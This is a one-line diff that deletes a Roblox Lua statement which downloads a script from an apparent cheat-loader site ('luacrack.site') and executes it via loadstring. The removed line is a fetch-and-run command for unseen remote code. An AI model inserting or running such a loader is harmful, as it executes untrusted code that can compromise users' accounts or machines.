@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://api.luacrack.site/files/v4/loaders/e54009a90b9d1bfa5245c293bfc26466.lua"))()
